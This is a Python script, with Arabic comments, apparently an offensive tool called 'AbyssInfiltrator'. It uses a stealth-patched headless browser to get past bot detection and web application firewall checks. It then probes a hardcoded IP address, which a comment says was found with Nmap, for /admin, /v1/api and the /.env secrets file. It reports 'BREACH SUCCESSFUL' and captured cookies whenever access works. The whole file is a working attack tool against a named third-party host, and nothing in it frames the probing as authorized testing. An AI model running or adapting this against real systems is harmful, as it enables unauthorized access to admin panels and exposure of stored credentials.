import asyncio
import sys
from playwright.async_api import async_playwright
from playwright_stealth import stealth_async

class AbyssInfiltrator:
    def __init__(self, target_ip):
        self.target_url = f"https://{target_ip}"
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

    async def execute_probe(self, path):
        async with async_playwright() as p:
            # تشغيل Chromium بصمة حقيقية (حتى في وضع headless)
            browser = await p.chromium.launch(headless=True)
            
            # إنشاء سياق متصفح يحاكي جهاز كمبيوتر حقيقي بدقة
            context = await browser.new_context(
                user_agent=self.user_agent,
                viewport={'width': 1920, 'height': 1080},
                device_scale_factor=1,
                has_touch=False,
                is_mobile=False
            )

            page = await context.new_page()
            
            # تفعيل وضع التخفي لتجاوز اختبارات الأتمتة (Bot Detection)
            await stealth_async(page)

            full_url = f"{self.target_url}{path}"
            print(f"[*] Deep Infiltration Started: {full_url}")

            try:
                # محاولة الوصول مع الانتظار حتى استقرار الشبكة تماماً
                # هذا يتجاوز تحديات الـ JS و redirects التي يضعها الـ WAF
                response = await page.goto(full_url, wait_until="networkidle", timeout=60000)
                
                if not response:
                    print("[-] Error: No response received (Possible TCP Reset by WAF)")
                    return

                status = response.status
                print(f"[+] Server Response Code: {status}")

                # تحليل المحتوى بعد التنفيذ الكامل للـ Scripts
                content = await page.content()
                cookies = await context.cookies()

                if status == 200:
                    print(f"[!!!] BREACH SUCCESSFUL: Access Granted to {path}")
                    print(f"[*] Page Title: {await page.title()}")
                    print(f"[*] Captured Cookies: {len(cookies)}")
                    # عرض جزء من السورس كود للتأكد من تخطي الـ WAF
                    print(f"[*] Source Preview: {content[:250]}...")
                
                elif status == 406:
                    print("[-] Failed (406): Still getting 'Not Acceptable'.")
                    print("[!] Analysis: WAF is likely blocking based on IP Reputation or Geofencing.")
                
                elif status == 403:
                    print("[-] Blocked (403): WAF bypassed, but access to this directory is forbidden.")
                
                else:
                    print(f"[-] Blocked with status: {status}")

            except Exception as e:
                print(f"[-] Execution Failure: {str(e)}")
            
            finally:
                await browser.close()

if __name__ == "__main__":
    # الهدف المكتشف من Nmap
    TARGET = "94.55.118.66"

    test_paths = ["/admin", "/v1/api", "/.env"]
    
    probe = AbyssInfiltrator(TARGET)
    
    loop = asyncio.get_event_loop()
    for path in test_paths:
        print("\n" + "="*50)
        loop.run_until_complete(probe.execute_probe(path))
